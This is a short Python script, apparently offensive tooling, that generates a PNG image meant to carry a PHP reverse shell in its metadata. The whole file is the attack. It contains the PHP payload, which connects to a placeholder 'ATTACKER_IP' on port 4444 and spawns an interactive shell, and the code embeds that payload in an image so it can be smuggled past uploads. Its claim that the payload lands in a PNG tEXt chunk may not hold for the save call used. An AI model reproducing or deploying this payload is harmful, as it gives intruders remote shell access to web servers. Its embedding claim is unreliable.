#!/usr/bin/env python3
"""Generate a 1920x1080 PNG with PHP reverse shell code embedded in image metadata."""

from PIL import Image
import io

# Create a black 1920x1080 PNG
img = Image.new('RGB', (1920, 1080), color='black')

# PHP reverse shell payload
php_payload = '''<?php
// PHP Reverse Shell - embedded in PNG metadata
// Connect back to attacker machine

$ip = 'ATTACKER_IP';  // Replace with your IP
$port = 4444;         // Replace with your port

$sock = fsockopen($ip, $port) or die("Could not connect");
exec("/bin/sh -i <&3 >&3 2>&3");
?>'''

# Embed PHP code in PNG text chunks (metadata comments)
img.save(
    '/home/surzal/git/payloads/reverse_shell.png',
    'PNG',
    comment=php_payload
)

print("Created reverse_shell.png (1920x1080) with embedded PHP payload.")
print(f"PHP code stored in PNG tEXt chunk metadata.")
